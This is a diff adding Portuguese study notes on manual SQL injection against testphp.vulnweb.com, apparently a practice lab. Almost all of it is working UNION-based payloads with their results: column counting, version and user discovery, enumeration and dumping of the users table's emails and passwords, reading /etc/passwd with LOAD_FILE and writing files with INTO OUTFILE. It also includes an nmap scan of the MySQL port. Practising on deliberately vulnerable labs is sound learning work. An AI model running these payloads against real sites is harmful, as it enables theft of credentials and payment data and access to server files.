@@ -1,0 +1,42 @@
+testphp.vulnweb.com/artists.php?artist=1'
+erro: Warning: mysql_fetch_array() expects parameter 1 to be resource, boolean given in /hj/var/www/artists.php on line 62 
+
+http://testphp.vulnweb.com/artists.php?artist=1 order by 3
+- identificamos que existe 3 campos atraves do order by 3
+
+Payload:
+1. Descobrindo aonde colocar informacoes
+	- -1 UNION SELECT 1, 2, 3 --
+	- Descobrimos que o campo 1 nao tem como colocar porque ja tem algo, porem os campos 2 e 3 estao vazios
+	
+2. Descobrindo a versao do banco de dados e usuario:
+	- -1 UNION SELECT 1, VERSION(), CURRENT_USER() --
+	- BD: 8.0.22-0ubuntu0.20.04.2
+	- user: acuart@localhost
+		
+- Para descobrir informacoes do ip: ping -c1 testphp.vulnweb.com
+		
+sudo nmap -sV -p 3306 44.228.249.3 -Pn    
+- PORT        STATE    SERVICE VERSION
+  3306/tcp   filtered     mysql
+
+3. Descobrir senhas 
+	- -1 UNION SELECT 1, 2, 3 FROM users -- (descobrimos que a tabela users existe)
+	- -1 UNION SELECT 1, email, 3 FROM users -- (descobrimos que o campo email existe)
+	- -1 UNION SELECT 1, pass, 3 FROM users -- (descobrimos que o campo pass existe)
+	- -1 UNION SELECT 1, email, pass FROM users --
+	- -1 UNION SELECT 1, 2, group_concat(email) FROM users --
+
+4. Descobrir os campos de uma tabela
+	- -1 UNION SELECT 1, group_concat(COLUMN_NAME), 3 FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name = 'users'
+	- colunas :address,cart,cc,email,name,pass,phone,uname
+	
+5. Selecionar Usuarios e senhas: 
+	- -1 UNION SELECT 1, group_concat(uname), group_concat(pass) FROM users --
+	- resultado - usuario: test e senha: test
+	
+6. Ler um arquivo
+	- -1 UNION SELECT 1, 2, LOAD_FILE('/etc/passwd') --
+	
+7. Escrever um arquivo 
+	- -1 UNION SELECT 1, 2, 'ola mundo' INTO OUTFILE '/tmp/ola.txt' --	
